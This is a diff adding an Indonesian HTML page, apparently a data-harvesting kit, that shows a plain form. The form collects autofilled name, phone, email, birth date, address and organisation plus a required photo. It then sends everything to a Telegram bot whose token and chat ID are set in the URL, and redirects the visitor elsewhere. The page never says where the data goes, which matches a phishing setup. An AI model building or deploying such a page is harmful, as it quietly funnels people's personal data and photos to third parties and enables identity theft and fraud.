@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Autofill Sender</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f0f2f5; padding: 20px; }
+        .container { max-width: 500px; margin: 0 auto; background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        h2 { text-align: center; margin-bottom: 20px; color: #333; }
+        
+        .form-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; font-weight: 600; font-size: 0.9em; color: #555; }
+        input, select, textarea { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; transition: 0.3s; }
+        input:focus { border-color: #0088cc; outline: none; }
+        
+        /* Highlight autofill agar terlihat jelas */
+        input:-webkit-autofill { -webkit-box-shadow: 0 0 0 30px white inset !important; }
+
+        .btn-submit { background-color: #0088cc; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .btn-submit:hover { background-color: #006699; }
+        .btn-submit:disabled { background-color: #ccc; cursor: not-allowed; }
+        
+        .hidden-info { font-size: 0.8em; color: red; text-align: center; margin-bottom: 10px; display: none; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>Form Data & Foto</h2>
+    <p id="error-msg" class="hidden-info">Parameter URL (token/chatid) tidak ditemukan!</p>
+
+    <form id="telegramForm">
+        <div class="form-group">
+            <label>Nama Lengkap</label>
+            <input type="text" id="nama" name="Nama" autocomplete="name" required placeholder="Nama Lengkap">
+        </div>
+
+        <div class="form-group">
+            <label>Nomor HP / WhatsApp</label>
+            <input type="tel" id="hp" name="No HP" autocomplete="tel" required placeholder="08xxxxxxxx">
+        </div>
+
+        <div class="form-group">
+            <label>Email</label>
+            <input type="email" id="email" name="Email" autocomplete="email" placeholder="email@contoh.com">
+        </div>
+
+        <div class="form-group">
+            <label>Tanggal Lahir</label>
+            <input type="date" id="dob" name="Tgl Lahir" autocomplete="bday">
+        </div>
+
+        <div class="form-group">
+            <label>Alamat Jalan</label>
+            <input type="text" id="alamat" name="Alamat" autocomplete="street-address" placeholder="Nama Jalan & No Rumah">
+        </div>
+
+        <div class="form-group">
+            <label>Kota / Kabupaten</label>
+            <input type="text" id="kota" name="Kota" autocomplete="address-level2">
+        </div>
+
+        <div class="form-group">
+            <label>Kode Pos</label>
+            <input type="text" id="kodepos" name="Kode Pos" autocomplete="postal-code">
+        </div>
+
+        <div class="form-group">
+            <label>Perusahaan / Organisasi</label>
+            <input type="text" id="org" name="Organisasi" autocomplete="organization">
+        </div>
+
+        <hr>
+
+        <div class="form-group">
+            <label>Upload Foto (Wajib)</label>
+            <input type="file" id="foto" accept="image/*" required>
+        </div>
+
+        <button type="submit" class="btn-submit" id="btnSend">Kirim Data</button>
+    </form>
+</div>
+
+<script>
+    // 1. Ambil Parameter dari URL (Shortcuts)
+    const urlParams = new URLSearchParams(window.location.search);
+    
+    // Format URL harus: website.com/?token=TOKEN_BOT&chatid=CHAT_ID&redirect=URL_TUJUAN
+    const botToken = urlParams.get('token'); 
+    const chatId = urlParams.get('chatid');
+    const redirectUrl = urlParams.get('redirect') || 'https://google.com'; // Default ke Google jika kosong
+
+    // Cek kelengkapan parameter
+    if (!botToken || !chatId) {
+        document.getElementById('error-msg').style.display = 'block';
+        document.getElementById('error-msg').innerText = "ERROR: Token Bot atau Chat ID belum diatur di URL!";
+        document.getElementById('btnSend').disabled = true;
+    }
+
+    // 2. Logika Pengiriman
+    document.getElementById('telegramForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const btn = document.getElementById('btnSend');
+        btn.innerText = "Mengirim...";
+        btn.disabled = true;
+
+        // Ambil data teks
+        const formData = new FormData();
+        const inputs = document.querySelectorAll('#telegramForm input:not([type="file"])');
+        let captionText = "📝 *DATA BARU MASUK*\n------------------\n";
+
+        inputs.forEach(input => {
+            if(input.value) {
+                captionText += `*${input.name}:* ${input.value}\n`;
+            }
+        });
+
+        // Ambil file foto
+        const fileInput = document.getElementById('foto');
+        const photo = fileInput.files[0];
+
+        formData.append("chat_id", chatId);
+        formData.append("photo", photo);
+        formData.append("caption", captionText);
+        formData.append("parse_mode", "Markdown");
+
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+
+            const result = await response.json();
+
+            if (result.ok) {
+                alert("Berhasil terkirim!");
+                // 3. Redirect Otomatis
+                window.location.href = redirectUrl;
+            } else {
+                alert("Gagal mengirim ke Telegram: " + result.description);
+                btn.innerText = "Kirim Data";
+                btn.disabled = false;
+            }
+        } catch (error) {
+            console.error(error);
+            alert("Terjadi kesalahan koneksi.");
+            btn.innerText = "Kirim Data";
+            btn.disabled = false;
+        }
+    });
+</script>
+
+</body>
+</html>
